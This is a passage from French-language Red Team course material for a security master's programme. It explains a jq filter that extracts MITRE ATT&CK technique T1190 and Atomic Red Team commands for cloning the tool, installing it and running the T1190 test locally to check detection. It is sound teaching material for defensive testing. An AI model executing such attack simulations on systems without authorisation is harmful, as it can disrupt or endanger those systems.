| `.external_references[0].external_id` | Chemin d'accès à l'identifiant MITRE ATT&CK (première référence externe) |
| `select(.external_references[0].external_id == "T1190")` | Filtre pour ne garder que la technique dont l'ID est "T1190" |
| `{name, description}` | Extrait uniquement les champs `name` et `description` de l'objet JSON |

**Explication des commandes Atomic Red Team :**

| Commande / Option | Rôle / Explication |
|---|---|
| `git clone https://github.com/redcanaryco/atomic-red-team.git` | Télécharge le dépôt contenant les tests de détection organisés par technique ATT&CK |
| `pip install -r requirements.txt` | Installe les dépendances Python nécessaires à l'exécution des tests |
| `Invoke-AtomicTest T1190 -ShowDetails` | Affiche les détails du test pour la technique T1190 sans l'exécuter (dry-run) |
| `Invoke-AtomicTest T1190 -Execute` | Exécute effectivement le test T1190 sur la machine locale (pour tester la détection) |

---

*Document rédigé pour la formation Red Team — Master 2 Sécurité et Défense des Systèmes d'Information — SDV 2026*
